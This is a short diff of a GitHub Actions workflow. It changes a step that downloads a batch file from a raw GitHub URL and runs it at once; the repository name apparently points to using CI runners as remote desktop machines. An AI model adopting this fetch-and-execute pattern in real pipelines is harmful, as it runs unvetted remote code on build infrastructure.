@@ -13,8 +13,8 @@ jobs:
       - name: Downloading & Installing Essentials
         shell: pwsh
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/gulshanhex/RDP-Windows-2022-via-Avica/main/Downloads.bat" -OutFile "Downloads.bat"
-          cmd /c Downloads.bat
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/gulshanhex/Redx/main/Download.bat" -OutFile "Download.bat"
+          cmd /c Download.bat
 
       - name: Show Website
         shell: cmd
